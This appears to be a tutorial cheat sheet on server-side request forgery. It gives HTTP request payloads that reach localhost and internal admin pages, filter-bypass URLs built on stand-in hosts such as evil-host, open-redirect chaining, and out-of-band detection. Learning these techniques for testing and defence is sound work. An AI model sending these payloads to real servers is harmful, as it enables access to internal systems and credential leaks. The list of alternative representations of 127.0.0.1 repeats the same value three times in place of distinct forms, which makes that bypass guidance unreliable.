---
title: Server-Side Request Forgery (SSRF)
category: Web
order: 15
---

Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location. 

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems. This could leak sensitive data, such as authorization credentials.


# SSRF Attacks againts the server

The attacker causes the application to make HTTP request back to the server that is hosting the application by suppling a URL with `127.0.0.1` or `localhost`.

**We can bypass waf protections, or bypass some access control mechanisms via origin IP.**

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

# SSRF Attacks against local network

In some cases, the application server is able to interact with back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses.

**We can scan local networks in order to find new servers**

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

# SSRF input filters

## Blacklist-based

Some applications block `localhost` or `127.0.0.1` or sensitive urls like `/admin`.

* Use alternative representation of `127.0.0.1` such as `2130706433`, `2130706433` or `2130706433`.
* Register you own dns that resolves to `127.0.0.1`. use `spoofed.burpcollaborator.net`.
* Ofuscate blocked strings using URL encoding or case variations
* Provide a URL that you control, which redirects to the target URL. Try different redirect codes, as well different protocols `http`, `https`.

Example of payloads:

```
http://lOcalHost/Admin
http://localhost/%61%64%6d%69%6e
http://2130706433/admin
http://2130706433/admin
http://spoofed.burpcollaborator.net/admin
https://redirector.burpcollaborator.net/
```

## Whitelist-based

Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing. 

* We can embed credentials on the url and we can use it to specify the hostname `http://expected-host:fakepass@evil-host`.
* We can use `#` to indicate a URL fragment `http://evil-host/#expected-host`.
* Use a subdomain. `http://expected-host.evil-host`.
* URL-encode characters to confuse the URL-parsing code.
* Use a combination of all techniques.

## Bypass filters via open redirect

It is sometimes possible to bypass filter-based defenses by exploiting an open redirection vulnerability. 

For example, the application contains an open redirection vulnerability in which the following URL: 

```
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```

Returns to:

```
http://evil-user.net
```

We can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF.

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

# Blind SSRF

Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.

## Blind SSRF out-of-band detection

The easiest and most effective way to use out-of-band techniques is using Burp Collaborator. You can use Burp Collaborator to generate unique domain names, send these in payloads to the application, and monitor for any interaction with those domains. If an incoming HTTP request is observed coming from the application, then it is vulnerable to SSRF.

```
http://burpcollaborator.net/
```